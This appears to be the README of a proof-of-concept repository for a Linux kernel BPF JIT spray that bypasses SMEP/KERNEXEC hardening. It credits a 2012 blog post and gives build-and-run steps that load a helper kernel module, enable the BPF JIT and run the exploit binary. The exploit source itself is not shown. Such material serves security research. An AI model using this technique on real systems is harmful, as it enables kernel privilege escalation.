# Linux kernel JIT spray for SMEP / KERNEXEC bypass

All credit to source listed below:
http://mainisusuallyafunction.blogspot.com/2012/11/attacking-hardened-linux-systems-with.html 


## How to run:

```
cd ko && make
cd ..
sudo insmod ko/jump.ko
echo 1 | sudo tee /proc/sys/net/core/bpf_jit_enable
gcc -Wall -O2 -o alameda alameda.c
./alameda
```        
